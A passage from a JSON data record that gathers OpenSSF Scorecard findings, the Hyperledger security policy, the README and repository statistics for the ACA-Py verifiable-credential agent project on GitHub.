                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/sonar-merge-main.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-merge-main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-merge-main.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-merge-main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sonar-pr.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/openwallet-foundation/acapy/sonar-pr.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: .devcontainer/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: demo/docker-agent/Dockerfile.acapy:1: pin your Docker image by updating ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2 to ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2@sha256:a3b77f123a4e2e076f5fbe6ddcd41a39e4e6866d0d7070bf0ca6cd00517cfde7",
                        "Warn: containerImage not pinned by hash: demo/docker-test/db/Dockerfile:1: pin your Docker image by updating postgres:17 to postgres:17@sha256:8d3be35b184e70d81e54cbcbd3df3c0b47f37d06482c0dd1c140db5dbcc6a808",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/elasticsearch/Dockerfile:4",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/curator/Dockerfile:1: pin your Docker image by updating untergeek/curator:8.0.16 to untergeek/curator:8.0.16@sha256:8ab15516eb320bddb042c6da3c81b57e4e69a7aac04efc32190db979fe0bfb5b",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/enterprise-search/Dockerfile:4",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/filebeat/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/fleet/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/heartbeat/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/logspout/Dockerfile:4: pin your Docker image by updating gliderlabs/logspout:master to gliderlabs/logspout:master@sha256:2d81c026e11ac67f7887029dbfd7d36ee986d946066b45c1dabd966278eb5681",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/extensions/metricbeat/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/kibana/Dockerfile:4",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/logstash/Dockerfile:4",
                        "Warn: containerImage not pinned by hash: demo/elk-stack/setup/Dockerfile:4",
                        "Warn: containerImage not pinned by hash: demo/multi-demo/Dockerfile.acapy:1: pin your Docker image by updating ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2 to ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2@sha256:a3b77f123a4e2e076f5fbe6ddcd41a39e4e6866d0d7070bf0ca6cd00517cfde7",
                        "Warn: containerImage not pinned by hash: demo/playground/Dockerfile.acapy:1: pin your Docker image by updating ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2 to ghcr.io/hyperledger/aries-cloudagent-python:py3.9-0.12.2@sha256:a3b77f123a4e2e076f5fbe6ddcd41a39e4e6866d0d7070bf0ca6cd00517cfde7",
                        "Warn: containerImage not pinned by hash: demo/playground/examples/Dockerfile.test.runner:1: pin your Docker image by updating python:3.12-slim to python:3.12-slim@sha256:032c52613401895aa3d418a4c563d2d05f993bc3ecc065c8f4e2280978acd249",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:2",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:11",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.bdd:1",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.demo:2",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.fixpermissions:5",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.run:2: pin your Docker image by updating python:3.12-slim-bullseye to python:3.12-slim-bullseye@sha256:3207ac8a818335cc1c045ce5bcc3b1adf345ee80049d7734151489c66fc64414",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.test:2",
                        "Warn: containerImage not pinned by hash: docs/mkdocs-dockerfile.yml:1: pin your Docker image by updating squidfunk/mkdocs-material to squidfunk/mkdocs-material@sha256:31eb7f7c86dc35e29ca5520e1826b3c7fd54ddd84adc20cb0a42f59d17aa912e",
                        "Warn: containerImage not pinned by hash: scenarios/Dockerfile:1: pin your Docker image by updating python:3.10 to python:3.10@sha256:fd0fa50d997eb56ce560c6e5ca6a1f5cf8fdff87572a16ac07fb1f5ca01eb608",
                        "Warn: downloadThenRun not pinned by hash: .devcontainer/Dockerfile:9-16",
                        "Warn: pipCommand not pinned by hash: demo/playground/examples/Dockerfile.test.runner:5",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:8",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:97-101",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.bdd:4",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.demo:13",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.demo:23",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.demo:29",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.run:15",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.test:12",
                        "Warn: pipCommand not pinned by hash: docs/mkdocs-dockerfile.yml:2",
                        "Warn: downloadThenRun not pinned by hash: scenarios/Dockerfile:7",
                        "Warn: pipCommand not pinned by hash: .devcontainer/post-install.sh:8",
                        "Warn: pipCommand not pinned by hash: .devcontainer/post-install.sh:9",
                        "Warn: pipCommand not pinned by hash: .devcontainer/post-install.sh:12",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pip-audit.yml:19",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pip-audit.yml:20",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish-docs.yml:29",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pythonpublish.yml:23",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pythonpublish.yml:24",
                        "Info:   0 out of  29 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  22 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  18 pipCommand dependencies pinned",
                        "Info:   0 out of  26 containerImage dependencies pinned",
                        "Info:   0 out of   2 downloadThenRun dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: SAST configuration detected: Snyk",
                        "Info: SAST configuration detected: Snyk",
                        "Info: all commits (30) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool detected",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/publish.yml:50",
                        "Warn: no topLevel permission defined: .github/workflows/bdd-integration-tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/bdd-interop-tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/format.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/nigthly.yml:1",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/pip-audit.yml:7",
                        "Warn: no topLevel permission defined: .github/workflows/pr-tests.yml:1",
                        "Warn: topLevel 'contents' permission set to 'write': .github/workflows/publish-docs.yml:11",
                        "Warn: no topLevel permission defined: .github/workflows/publish.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pythonpublish.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/scenario-integration-tests.yml:1",
                        "Info: topLevel permissions set to 'read-all': .github/workflows/scorecard.yml:21",
                        "Warn: no topLevel permission defined: .github/workflows/snyk-lts.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/snyk.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/sonar-merge-main.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/sonar-pr.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/hyperledger/aries-cloudagent-python/contents/SECURITY.md",
        "SecurityPolicy_content": "# Hyperledger Security Policy\n\n## Reporting a Security Bug\n\nIf you think you have discovered a security issue in any of the Hyperledger projects, we'd love to\nhear from you. We will take all security bugs seriously and if confirmed upon investigation we will\npatch it within a reasonable amount of time and release a public security bulletin discussing the\nimpact and credit the discoverer.\n\nThere are two ways to report a security bug. The easiest is to email a description of the flaw and\nany related information (e.g. reproduction steps, version) to\n[security at hyperledger dot org](mailto:security@hyperledger.org).\n\nThe other way is to file a confidential security bug in our\n[JIRA bug tracking system](https://jira.hyperledger.org). Be sure to set the “Security Level” to\n“Security issue”.\n\nThe process by which the Hyperledger Security Team handles security bugs is documented further in\nour [Defect Response page](https://wiki.hyperledger.org/display/SEC/Defect+Response) on our\n[wiki](https://wiki.hyperledger.org).\n",
        "project_all_labels": [
            "0.12.0",
            "1.0.0",
            "AIP 2.0",
            "AnonCreds",
            "blocked",
            "bug",
            "CI/CD",
            "dependencies",
            "Discuss",
            "docker",
            "documentation",
            "duplicate",
            "enhancement",
            "Epic",
            "github_actions",
            "good first issue",
            "help wanted",
            "High Priority",
            "incomplete",
            "interop",
            "invalid",
            "python",
            "question",
            "Support",
            "Unqualified DIDs",
            "wontfix"
        ],
        "README_content": "# ACA-Py -- A Cloud Agent - Python  <!-- omit in toc -->\n\n🚨 **ACA-Py is transitioning to the [OpenWallet Foundation] (OWF)!** 🚨\n\n[OpenWallet Foundation]: https://openwallet.foundation/\n\nWe’re excited to announce that the ACA-Py project has moved to the OWF's GitHub organization as the [new \"acapy\" project](https://github.com/openwallet-foundation/project-proposals/blob/main/projects/aca-py.md).\n\nFor details on what this means for ACA-Py users, including steps for updating deployments, please follow the updates in [GitHub Issue #3250]. We'll keep you informed about how to update your deployment to reflect this change. Stay tuned!\n\n[GitHub Issue #3250]: https://github.com/openwallet-foundation/acapy/issues/3250\n\n<p float=\"left\">\n  <a href=\"https://pypi.org/project/acapy-agent/\"><img src=\"https://img.shields.io/pypi/v/acapy-agent\" width=\"100\" height=\"20\" />\n  <img src=\"https://sonarcloud.io/images/project_badges/sonarcloud-white.svg\" width=\"120\" height=\"20\" />\n  <img src=\"https://sonarcloud.io/api/project_badges/measure?project=openwallet-foundation_acapy&metric=coverage\" width=\"120\"  height=\"20\" />\n  &nbsp;<img src=\"https://sonarcloud.io/api/project_badges/measure?project=openwallet-foundation_acapy&metric=security_rating\" width=\"100\"  height=\"20\" />\n  &nbsp;<img src=\"https://sonarcloud.io/api/project_badges/measure?project=openwallet-foundation_acapy&metric=vulnerabilities\" width=\"120\"  height=\"20\" />\n  &nbsp;<img src=\"https://sonarcloud.io/api/project_badges/measure?project=openwallet-foundation_acapy&metric=ncloc\" width=\"120\"  height=\"20\" />\n</p>\n\n> An easy to use enterprise wallet for building decentralized trust services using any language that supports sending/receiving HTTP requests.\n\nFull access to an organized set of all of the ACA-Py documents is available at [https://aca-py.org](https://aca-py.org).\nCheck it out! It's much easier to navigate than the ACA-Py GitHub repo for reading the documentation.\n\n:new: ACA-Py Plugins have their own store! Visit [https://plugins.aca-py.org](https://plugins.aca-py.org) to find ready-to-use functionality to add to your ACA-Py deployment, and to learn how to build your own plugins.\n\n## Overview\n\nACA-Py is a foundation for building Verifiable Credential (VC) ecosystems. It operates in the second and third layers of the [Trust Over IP framework (PDF)](https://trustoverip.org/wp-content/uploads/2020/05/toip_050520_primer.pdf) using a variety of verifiable credential formats and protocols. ACA-Py runs on servers (cloud, enterprise, IoT devices, and so forth), and is not designed to run on mobile devices.\n\nACA-Py includes support for the concepts and features that make up [Aries Interop Profile (AIP) 2.0](https://github.com/hyperledger/aries-rfcs/tree/main/concepts/0302-aries-interop-profile#aries-interop-profile-version-20). [ACA-Py’s supported features](./docs/features/SupportedRFCs.md) include, most importantly, protocols for issuing, verifying, and holding verifiable credentials using both [Hyperledger AnonCreds] verifiable credential format, and the [W3C Standard Verifiable Credential Data Model] format using JSON-LD with LD-Signatures and BBS+ Signatures. Coming soon -- issuing and presenting [Hyperledger AnonCreds] verifiable credentials using the [W3C Standard Verifiable Credential Data Model] format.\n\n[Hyperledger AnonCreds]: https://www.hyperledger.org/use/anoncreds\n[W3C Standard Verifiable Credential Data Model]: https://www.w3.org/TR/vc-data-model/\n\nTo use ACA-Py you create a business logic \"controller\" that talks to an ACA-Py instance (sending HTTP requests and receiving webhook notifications), and ACA-Py handles the various protocols and related functionality. Your controller can be built in any language that supports making and receiving HTTP requests; knowledge of Python is not needed. Together, this means you can focus on building VC solutions using familiar web development technologies, instead of having to learn the nuts and bolts of low-level cryptography and Trust over IP-type protocols.\n\nThis [checklist-style overview document](./docs/features/SupportedRFCs.md) provides a full list of the features in ACA-Py.\nThe following is a list of some of the core features needed for a production deployment, with a link to detailed information about the capability.\n\n## LTS Releases\n\nThe ACA-Py community provides periodic releases with new features and\nimprovements. Certain releases are designated by the ACA-Py maintainers as\nlong-term support (LTS) releases and listed in this document. Critical bugs and\nimportant (as determined by the ACA-Py Maintainers) fixes are backported to\nthe active LTS releases. Each LTS release will be supported with patches for **9\nmonths** following the designation of the **next** LTS Release. For more details see\nthe [LTS strategy](./LTS-Strategy.md).\n\nCurrent LTS releases are:\n\n- [0.12](https://github.com/openwallet-foundation/acapy/releases/tag/0.12.1) **Current LTS Release**\n- [0.11](https://github.com/openwallet-foundation/acapy/releases/tag/0.11.1) **End of Life: January 2025**\n\nUnless specified in the **Breaking Changes** section of the ACA-Py\n[CHANGELOG](./CHANGELOG.md), all LTS patch releases will be able to be deployed\n**without** an upgrade process from its prior release. Minor/Major release upgrades\nsteps (if any) of ACA-Py are tested and documented in the ACA-Py\n[CHANGELOG](./CHANGELOG.md) per release and in the project documents published\nat [https://aca-py.org](https://aca-py.org) from the markdown files in this\nrepository.\n\nACA-Py releases and release notes can be found on the [GitHub releases\npage](https://github.com/openwallet-foundation/acapy/releases).\n\n### Multi-Tenant\n\nACA-Py supports \"multi-tenant\" scenarios. In these scenarios, one (scalable) instance of ACA-Py uses one database instance, and are together capable of managing separate secure storage (for private keys, DIDs, credentials, etc.) for many different actors. This enables (for example) an \"issuer-as-a-service\", where an enterprise may have many VC issuers, each with different identifiers, using the same instance of ACA-Py to interact with VC holders as required. Likewise, an ACA-Py instance could be a \"cloud wallet\" for many holders (e.g. people or organizations) that, for whatever reason, cannot use a mobile device for a wallet. Learn more about multi-tenant deployments [here](./docs/features/Multitenancy.md).\n\n### Mediator Service\n\nStartup options allow the use of an ACA-Py as a DIDComm [mediator](https://github.com/hyperledger/aries-rfcs/tree/main/concepts/0046-mediators-and-relays#summary) using core DIDComm protocols to coordinate its mediation role. Such an ACA-Py instance receives, stores and forwards messages to DIDComm agents that (for example) lack an addressable endpoint on the Internet such as a mobile wallet. A live instance of a public mediator based on ACA-Py is available [here](https://indicio-tech.github.io/mediator/) from [Indicio, PBC](https://indicio.tech). Learn more about deploying a mediator [here](./docs/features/Mediation.md). See the [Aries Mediator Service](https://github.com/hyperledger/aries-mediator-service) for a \"best practices\" configuration of an Aries mediator.\n\n### Indy Transaction Endorsing\n\nACA-Py supports a Transaction Endorsement protocol, for agents that don't have write access to an Indy ledger.  Endorser support is documented [here](./docs/features/Endorser.md).\n\n### Scaled Deployments\n\nACA-Py supports deployments in scaled environments such as in Kubernetes environments where ACA-Py and its storage components can be horizontally scaled as needed to handle the load.\n\n### VC-API Endpoints\n\nA set of endpoints conforming to the vc-api specification are included to manage w3c credentials and presentations. They are documented [here](./docs/features/JsonLdCredentials.md#vc-api) and a postman demo is available [here](./docs/features/JsonLdCredentials.md#vc-api).\n\n## Example Uses\n\nThe business logic you use with ACA-Py is limited only by your imagination. Possible applications include:\n\n- An interface to a legacy system to issue verifiable credentials\n- An authentication service based on the presentation of verifiable credential proofs\n- An enterprise wallet to hold and present verifiable credentials about that enterprise\n- A user interface for a person to use a wallet not stored on a mobile device\n- An application embedded in an IoT device, capable of issuing verifiable credentials about collected data\n- A persistent connection to other agents that enables secure messaging and notifications\n- Custom code to implement a new service.\n\n## Getting Started\n\nFor those new to SSI, Wallets, and ACA-Py, there are a couple of Linux Foundation edX courses that provide a good starting point.\n\n- [Identity in Hyperledger: Indy, Aries and Ursa](https://www.edx.org/course/identity-in-hyperledger-aries-indy-and-ursa)\n- [Becoming a Hyperledger Aries Developer](https://www.edx.org/course/becoming-a-hyperledger-aries-developer)\n\nThe latter is the most useful for developers wanting to get a solid basis in using ACA-Py and other Aries Frameworks.\n\nAlso included here is a much more concise (but less maintained) [Getting Started Guide](./docs/gettingStarted/README.md) that will take you from knowing next to nothing about decentralized identity to developing Aries-based business apps and services. You’ll run an Indy ledger (with no ramp-up time), ACA-Py apps and developer-oriented demos. The guide has a table of contents so you can skip the parts you already know.\n\n### Understanding the Architecture\n\nThere is an [architectural deep dive webinar](https://www.youtube.com/watch?v=FXTQEtB4fto&feature=youtu.be) presented by the ACA-Py team, and [slides from the webinar](https://docs.google.com/presentation/d/1K7qiQkVi4n-lpJ3nUZY27OniUEM0c8HAIk4imCWCx5Q/edit#slide=id.g5d43fe05cc_0_77) are also available. The picture below gives a quick overview of the architecture, showing an instance of ACA-Py, a controller and the interfaces between the controller and ACA-Py, and the external paths to other agents and public ledgers on the Internet.\n\n![drawing](./aca-py_architecture.png)\n\nYou can extend ACA-Py using plug-ins, which can be loaded at runtime.  Plug-ins are mentioned in the [webinar](https://docs.google.com/presentation/d/1K7qiQkVi4n-lpJ3nUZY27OniUEM0c8HAIk4imCWCx5Q/edit#slide=id.g5d43fe05cc_0_145) and are [described in more detail here](./docs/features/PlugIns.md). An ever-expanding set of ACA-Py plugins can be found\nin the [ACA-Py Plugins repository]. Check them out -- it might already have the very plugin you need!\n\n[ACA-Py Plugins repository]: https://plugins.aca-py.org\n\n### Installation and Usage\n\nUse the [\"install and go\" page for developers](./docs/features/DevReadMe.md) if you are comfortable with decentralized trust concepts. ACA-Py can be run with Docker without installation (highly recommended), or can be installed [from PyPi](https://pypi.org/project/acapy-agent/). In the repository `/demo` folder there is a full set of demos for developers to use in getting up to speed quickly. Start with the [Traction Workshop] to go through a complete ACA-Py-based Issuer-Holder-Verifier flow in about 20 minutes. Next, the [Alice-Faber Demo](./docs/demo/README.md) is a great way for developers try a zero-install example of how to use the ACA-Py API to operate a couple of Agents. The [Read the Docs](https://aries-cloud-agent-python.readthedocs.io/en/latest/) overview is also a way to understand the internal modules and APIs that make up an ACA-Py instance.\n\nIf you would like to develop on ACA-Py locally note that we use Poetry for dependency management and packaging. If you are unfamiliar with poetry please see our [cheat sheet](./docs/deploying/Poetry.md)\n\n[Traction Workshop]: ./docs/demo/ACA-Py-Workshop.md\n\n## About the ACA-Py Admin API\n\nThe [overview of ACA-Py’s API](./docs/features/AdminAPI.md) is a great starting place for learning about the ACA-Py API when you are starting to build your own controller.\n\nAn ACA-Py instance puts together an OpenAPI-documented REST interface based on the protocols that are loaded. This is used by a controller application (written in any language) to manage the behavior of the agent. The controller can initiate actions (e.g. issuing a credential) and can respond to agent events (e.g. sending a presentation request after a connection is accepted). Agent events are delivered to the controller as webhooks to a configured URL.\n\nTechnical note: the administrative API exposed by the agent for the controller to use must be protected with an API key (using the --admin-api-key command line arg) or deliberately left unsecured using the --admin-insecure-mode command line arg. The latter should not be used other than in development if the API is not otherwise secured.\n\n## Troubleshooting\n\nThere are a number of resources for getting help with ACA-Py and troubleshooting\nany problems you might run into. The\n[Troubleshooting](./docs/testing/Troubleshooting.md) document contains some\nguidance about issues that have been experienced in the past. Feel free to\nsubmit PRs to supplement the troubleshooting document! Searching the [ACA-Py\nGitHub issues](https://github.com/openwallet-foundation/acapy/issues)\nmay uncovers challenges you are having that others have experienced, often\nwith solutions. As well, there is the \"aca-py\"\nchannel on the OpenWallet Foundation Discord chat server ([invitation\nhere](https://discord.gg/openwalletfoundation)).\n\n## Credit\n\nThe initial implementation of ACA-Py was developed by the Government of British Columbia’s Digital Trust Team in Canada. To learn more about what’s happening with decentralized identity and digital trust in British Columbia, checkout the [BC Digital Trust] website.\n\n[BC Digital Trust]: https://digital.gov.bc.ca/digital-trust/\n\nSee the [MAINTAINERS.md](./MAINTAINERS.md) file for how to find a list of the current ACA-Py\nmaintainers, and guidelines for becoming a Maintainer. We'd love to have you\njoin the team if you are willing and able to carry out the [duties of a Maintainer](./MAINTAINERS.md#the-duties-of-a-maintainer).\n\n## Contributing\n\nPull requests are welcome! Please read our [contributions guide](./CONTRIBUTING.md) and submit your PRs. We enforce [developer certificate of origin](https://developercertificate.org/) (DCO) commit signing — [guidance](https://github.com/apps/dco) on this is available. We also welcome issues submitted about problems you encounter in using ACA-Py.\n\n## License\n\n[Apache License Version 2.0](https://github.com/openwallet-foundation/acapy/blob/main/LICENSE)\n",
        "num_commits": 9708,
        "project_age_days": 1954,
        "project_created_at": "2019-06-24",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 131,
        "num_pull": 2025,
        "num_issues": 3320,
        "num_opening_issue": 134,
        "project_size(kB)": 74512,
        "num_stargazers": 417,
        "num_watchers": 417,
        "num_forks": 514,
        "num_subscribers": 30,
        "SecurityPolicy_created_at": "2019-09-27 10:16:59",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c3dd3beb819df24dc34cafd1cc937cbe5e8b1732",
                "url": "https://github.com/openwallet-foundation/acapy/commit/c3dd3beb819df24dc34cafd1cc937cbe5e8b1732",
                "date": "2024-02-08 15:01:51"
            },
            {
                "commit_id": "b7d8d4f5e9ed10e2ac4f46cbcae5183ff91742df",
                "url": "https://github.com/openwallet-foundation/acapy/commit/b7d8d4f5e9ed10e2ac4f46cbcae5183ff91742df",
                "date": "2021-02-06 20:43:05"
            },
            {
                "commit_id": "50858fe9add132efe69c0491c94708272224bd49",
                "url": "https://github.com/openwallet-foundation/acapy/commit/50858fe9add132efe69c0491c94708272224bd49",
                "date": "2019-09-27 10:16:59"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    }
]